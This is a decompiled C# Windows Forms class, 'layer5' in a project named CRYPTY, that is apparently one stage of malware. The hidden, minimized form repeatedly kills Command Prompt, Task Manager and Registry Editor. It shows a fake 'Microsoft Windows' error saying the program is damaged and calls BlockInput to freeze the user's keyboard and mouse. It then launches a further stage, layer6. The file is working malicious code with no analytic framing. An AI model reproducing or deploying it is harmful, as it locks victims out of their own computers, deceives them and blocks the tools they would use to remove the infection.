using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using CRYPTY.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace CRYPTY;

[DesignerGenerated]
public class layer5 : Form
{
	private IContainer components;

	internal virtual Timer disableCMD
	{
		[CompilerGenerated]
		get
		{
			return _disableCMD;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = disableCMD_Tick;
			Timer val = _disableCMD;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_disableCMD = value;
			val = _disableCMD;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer disableTASKMGR
	{
		[CompilerGenerated]
		get
		{
			return _disableTASKMGR;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = disableTASKMGR_Tick;
			Timer val = _disableTASKMGR;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_disableTASKMGR = value;
			val = _disableTASKMGR;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer disableREGEDIT
	{
		[CompilerGenerated]
		get
		{
			return _disableREGEDIT;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = disableREGEDIT_Tick;
			Timer val = _disableREGEDIT;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_disableREGEDIT = value;
			val = _disableREGEDIT;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer disableInput
	{
		[CompilerGenerated]
		get
		{
			return _disableInput;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = disableInput_Tick;
			Timer val = _disableInput;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			_disableInput = value;
			val = _disableInput;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	public layer5()
	{
		((Form)this).add_Load((EventHandler)layer5_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		components = new Container();
		disableCMD = new Timer(components);
		disableTASKMGR = new Timer(components);
		disableREGEDIT = new Timer(components);
		disableInput = new Timer(components);
		((Control)this).SuspendLayout();
		disableCMD.set_Enabled(true);
		disableTASKMGR.set_Enabled(true);
		disableREGEDIT.set_Enabled(true);
		disableInput.set_Enabled(true);
		disableInput.set_Interval(1000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_CausesValidation(false);
		((Form)this).set_ClientSize(new Size(10, 10));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("layer5");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long BlockInput(long fBlock);

	private void layer5_Load(object sender, EventArgs e)
	{
		disableCMD.Start();
		disableTASKMGR.Start();
		disableREGEDIT.Start();
		((Control)MyProject.Forms.layer6).Show();
	}

	public object showErrorMessage()
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		((Form)this).set_TopMost(true);
		object obj = "This program has been damaged, possibly by a software bug.";
		object obj2 = 16;
		object obj3 = "Microsoft Windows";
		_ = (object)Interaction.MsgBox(RuntimeHelpers.GetObjectValue(obj), (MsgBoxStyle)Conversions.ToInteger(obj2), RuntimeHelpers.GetObjectValue(obj3));
		((Form)this).set_TopMost(false);
		return "";
	}

	private void disableCMD_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("cmd");
			foreach (Process process in processesByName)
			{
				process.Kill();
				showErrorMessage();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void disableTASKMGR_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("taskmgr");
			foreach (Process process in processesByName)
			{
				process.Kill();
				showErrorMessage();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void disableREGEDIT_Tick(object sender, EventArgs e)
	{
		try
		{
			Process[] processesByName = Process.GetProcessesByName("regedit");
			foreach (Process process in processesByName)
			{
				process.Kill();
				showErrorMessage();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void disableInput_Tick(object sender, EventArgs e)
	{
		BlockInput(-1L);
	}
}
